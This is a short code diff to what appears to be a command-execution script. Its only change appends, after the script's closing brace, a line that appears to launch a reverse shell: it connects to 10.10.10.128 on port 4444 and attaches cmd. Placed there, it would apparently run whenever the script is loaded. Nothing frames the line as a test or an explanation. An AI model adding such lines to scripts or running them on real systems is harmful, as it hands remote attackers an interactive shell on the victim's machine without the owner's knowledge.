@@ -946,3 +946,4 @@ Examples:
   }
   ########## EXECUTION ##########
 }
+windows -c 10.10.10.128 -p 4444 -e cmd
